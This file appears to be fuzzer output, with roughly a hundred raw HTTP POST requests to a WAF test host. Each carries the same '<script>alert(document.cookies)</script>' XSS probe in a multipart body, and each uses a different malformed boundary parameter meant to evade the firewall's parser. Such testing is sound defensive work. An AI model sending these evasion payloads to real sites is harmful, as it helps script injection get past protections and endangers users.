POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 737\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 801\r\nContent-Type: multipart/form-data; boundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 865\r\nContent-Type: multipart/form-data; bou\x1fnZ\x19ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 929\r\nContent-Type: multipart/form-data; boundaryboundary=ounary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 993\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 4\r\nContent-Type: multipart/form-data; oundayboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 68\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 132\r\nContent-Type: multipart/form-data; boundabound0aryboundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 196\r\nContent-Type: multipart/form-data; bonZa_ryb1un\x15yary=boundarye{oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 260\r\nContent-Type: multipart/form-data; boundaryboundary=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 324\r\nContent-Type: multipart/form-data; b\x00oladr\x19y==bund\x01y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 388\r\nContent-Type: multipart/form-data; boVndryb#oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 452\r\nContent-Type: multipart/form-data; bou4*ary=bounLar\x07;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 516\r\nContent-Type: multipart/form-data; =\x15boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 580\r\nContent-Type: multipart/form-data; botuXa\x0ey=bundy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 644\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 708\r\nContent-Type: multipart/form-data; boundary=bound%ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 772\r\nContent-Type: multipart/form-data; boundary=oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 836\r\nContent-Type: multipart/form-data; =\xc2\xbboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 900\r\nContent-Type: multipart/form-data; ==boundary=ou1dar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 964\r\nContent-Type: multipart/form-data; ==bo?ndary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 5\r\nContent-Type: multipart/form-data; boundaryboundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 69\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 133\r\nContent-Type: multipart/form-data; bounpry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 197\r\nContent-Type: multipart/form-data; boundrybunLaryboukdar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 261\r\nContent-Type: multipart/form-data; Houndaryb$n2dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 325\r\nContent-Type: multipart/form-data; boundarybou\x1endary=ound=ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 389\r\nContent-Type: multipart/form-data; boukdaryboudarybondaryeb\x05u7ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 453\r\nContent-Type: multipart/form-data; bounda\x7fYy=boundar`;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 517\r\nContent-Type: multipart/form-data; \x1aoundary=boundanry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 581\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 645\r\nContent-Type: multipart/form-data; bodary=bundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 709\r\nContent-Type: multipart/form-data; 5%oboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 773\r\nContent-Type: multipart/form-data; boundFary=boNndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 837\r\nContent-Type: multipart/form-data; b\x14ounJaUr\x02yk\x01oGndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 901\r\nContent-Type: multipart/form-data; boundar"y=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 965\r\nContent-Type: multipart/form-data; bounaryboundarybounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 51\r\nContent-Type: multipart/form-data; boundKary==bouidary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 115\r\nContent-Type: multipart/form-data; bondary=bondarybounWdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 179\r\nContent-Type: multipart/form-data; boundaryboundarboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 243\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 307\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 371\r\nContent-Type: multipart/form-data; \x1aboundary=bunday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 435\r\nContent-Type: multipart/form-data; boundary=boun\x06ar);\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 499\r\nContent-Type: multipart/form-data; boundary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 563\r\nContent-Type: multipart/form-data; =bundry=bouhdry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 627\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 691\r\nContent-Type: multipart/form-data; boun/aryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 755\r\nContent-Type: multipart/form-data; bunuar\x1b=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 819\r\nContent-Type: multipart/form-data; boundarybounda;rybou=ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 883\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 947\r\nContent-Type: multipart/form-data; bound`ry=boundr;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 8\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 72\r\nContent-Type: multipart/form-data; boundary=bo,undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 136\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 200\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 264\r\nContent-Type: multipart/form-data; boundaybounarybuOdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 328\r\nContent-Type: multipart/form-data; boundary===bhVnZdar=y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 392\r\nContent-Type: multipart/form-data; boundarybY\x04dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 456\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 520\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 584\r\nContent-Type: multipart/form-data; ====;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 648\r\nContent-Type: multipart/form-data; \toundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 712\r\nContent-Type: multipart/form-data; bounGdary\x11bXundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 776\r\nContent-Type: multipart/form-data; bouncdzryboundaryboundarybundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 840\r\nContent-Type: multipart/form-data; ?boundar:==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 904\r\nContent-Type: multipart/form-data; oundarbundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 968\r\nContent-Type: multipart/form-data; \x1bboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 43\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 107\r\nContent-Type: multipart/form-data; bounda\x7fry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 171\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 235\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 299\r\nContent-Type: multipart/form-data; boundhary=A:bouzndar+;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 363\r\nContent-Type: multipart/form-data; boundaryboundayboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 427\r\nContent-Type: multipart/form-data; oundary=bound\x05ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 491\r\nContent-Type: multipart/form-data; "bo*und\x14urboundarybound\x08ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 555\r\nContent-Type: multipart/form-data; =koundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 619\r\nContent-Type: multipart/form-data; boundary\x14boundar=boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 683\r\nContent-Type: multipart/form-data; bundary=bo%nd~ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 747\r\nContent-Type: multipart/form-data; boundayboundary=oundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 811\r\nContent-Type: multipart/form-data; boundary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 875\r\nContent-Type: multipart/form-data; ==bounh\x0cdaryboundaryboundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 939\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 61\r\nContent-Type: multipart/form-data; boundary=bound8\x16ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 125\r\nContent-Type: multipart/form-data; boundaQy=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 189\r\nContent-Type: multipart/form-data; buday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 253\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 317\r\nContent-Type: multipart/form-data; boundaryboundaryb&oundvarRy=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 381\r\nContent-Type: multipart/form-data; =Eun:daRy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 445\r\nContent-Type: multipart/form-data; o.5unday=boku?n3dasy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 509\r\nContent-Type: multipart/form-data; bundary=boundari;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 573\r\nContent-Type: multipart/form-data; b2oundaryboundr-bolndaryb\x08ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 637\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 701\r\nContent-Type: multipart/form-data; boudarybo\x16ndar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 765\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
